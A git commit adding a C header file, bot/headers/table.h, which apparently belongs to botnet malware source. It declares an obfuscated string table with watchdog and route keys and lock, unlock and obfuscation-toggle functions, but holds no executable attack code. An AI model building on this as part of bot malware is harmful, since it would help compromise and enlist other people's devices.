c599c565398748f553902ce0ef1e618cff9af740
qqa112 <49566407+qqa112@users.noreply.github.com>
2019-06-27 17:55:05 -0400

    Add files via upload

---
+++ bot/headers/table.h
@@ -0,0 +1,27 @@
+#pragma once
+
+#include <stdint.h>
+#include "includes.h"
+
+struct table_value
+{
+    char *val;
+    uint16_t val_len;
+
+    #ifdef DEBUG
+        BOOL locked;
+    #endif
+};
+
+#define TABLE_MISC_WATCHDOG 1
+#define TABLE_MISC_WATCHDOG2 2
+#define TABLE_MISC_ROUTE 3
+#define TABLE_MAX_KEYS 4
+
+void table_init(void);
+void table_unlock_val(uint8_t);
+void table_lock_val(uint8_t); 
+char *table_retrieve_val(int, int *);
+
+static void add_entry(uint8_t, char *, int);
+static void toggle_obf(uint8_t);
